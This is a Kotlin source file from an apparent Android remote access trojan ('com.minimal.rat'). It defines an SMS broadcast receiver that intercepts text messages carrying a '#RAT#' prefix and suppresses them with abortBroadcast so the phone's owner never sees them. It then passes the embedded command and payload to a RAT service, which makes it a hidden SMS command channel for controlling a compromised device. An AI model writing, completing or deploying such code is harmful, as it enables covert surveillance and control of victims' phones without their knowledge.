package com.minimal.rat.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.minimal.rat.service.RatService
import com.minimal.rat.util.DeviceUtils

class SmsReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "SmsReceiver"
        private const val CMD_PREFIX = "#RAT#"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return
        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        for (pdu in pdus) {
            val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(pdu as ByteArray, bundle.getString("format"))
            } else {
                SmsMessage.createFromPdu(pdu as ByteArray)
            }
            val body = msg.messageBody ?: ""
            if (body.startsWith(CMD_PREFIX)) {
                abortBroadcast()
                val parts = body.substring(CMD_PREFIX.length).split("|", limit = 2)
                if (parts.size >= 2) {
                    val cmd = parts[0]
                    val payload = parts[1]
                    RatService.getInstance()?.sendCommand("sms_$cmd", payload)
                }
            }
        }
    }
}